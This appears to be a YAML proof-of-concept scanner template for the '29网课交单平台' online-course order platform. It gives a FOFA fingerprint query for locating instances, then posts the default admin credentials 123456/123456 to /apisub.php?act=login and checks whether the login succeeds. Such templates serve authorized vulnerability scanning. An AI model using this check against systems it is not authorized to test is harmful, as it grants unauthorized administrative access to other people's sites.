id: poc-yaml-29-ocsp-default-password
info:
  name: 29网课交单平台 默认口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: 29网课交单平台
  fofa: body="/apisub.php"
requests:
- method: GET
  path: /admin/login.php
  expression: status_code == 200 && contains(body,"/apisub.php")
- method: POST
  path: /apisub.php?act=login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: user=123456&pass=123456
  expression: "status_code == 200 && \ncontains(body,`{\"code\":1,\"msg\":\"登录成功\"\
    }`) &&\ncontains(content_type,\"application/json\")\n"
variables: {}
transport: http
